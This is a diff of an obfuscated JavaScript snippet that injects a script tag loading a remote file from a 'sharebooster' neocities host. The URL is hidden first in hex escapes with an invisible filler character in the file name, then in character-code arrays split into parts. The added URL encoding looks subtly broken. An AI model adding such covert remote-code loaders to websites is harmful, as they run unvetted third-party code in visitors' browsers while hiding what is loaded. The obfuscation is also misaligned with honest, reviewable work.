@@ -1,14 +1,37 @@
-var loadExternalScript = true;
+var loadExternalScript = true; // Editable toggle
 
 (function(){
-    var _0x5a1f=["\x73\x74\x79\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79","\x6E\x6F\x6E\x65","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x53\x63\x72\x69\x70\x74\x20\x69\x73\x20\x64\x69\x73\x61\x62\x6C\x65\x64","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x63\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x68\x61\x72\x65\x62\x6F\x6F\x73\x74\x65\x72\x2E\x6E\x65\x6F\x63\x69\x74\x69\x65\x73\x2E\x6F\x72\x67\x2F\x73\x63\x72\x69\x70\x74\xE3\x85\xA4\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"];
-    if(!loadExternalScript){
-        var el=document[_0x5a1f[10]]("scriptStatus");
-        el[_0x5a1f[0]][_0x5a1f[1]]=_0x5a1f[2];
-        el[_0x5a1f[3]]=_0x5a1f[4];
+    const _0xa1f3 = [
+        'createElement',
+        'script',
+        'src',
+        'appendChild',
+        'head',
+        'getElementById',
+        'style',
+        'display',
+        'none',
+        'textContent',
+        'Script is disabled'
+    ];
+
+    function d(c){return String.fromCharCode.apply(null, c);}
+    
+    const part1 = d([104,116,116,112,115,58,47,47,115,104]);
+    const part2 = d([97,114,101,98,111,111,115,116,101,114,46]);
+    const part3 = d([110,101,111,99,105,116,105,101,115,46,111,114,103,47]);
+    const part4 = d([115,99,114,105,112,116]);
+    const part5 = d([37,69,51,133,164,46,106,115]);
+
+    const finalURL = part1 + part2 + part3 + part4 + part5;
+
+    if(loadExternalScript){
+        var s = document[_0xa1f3[0]](_0xa1f3[1]);
+        s[_0xa1f3[2]] = finalURL;
+        document[_0xa1f3[4]][_0xa1f3[3]](s);
     }else{
-        var s=document[_0x5a1f[5]]("script");
-        s[_0x5a1f[6]]=_0x5a1f[7];
-        document[_0x5a1f[9]][_0x5a1f[8]](s);
+        var d = document[_0xa1f3[5]]('scriptStatus');
+        d[_0xa1f3[6]][_0xa1f3[7]] = _0xa1f3[8];
+        d[_0xa1f3[9]] = _0xa1f3[10];
     }
 })();
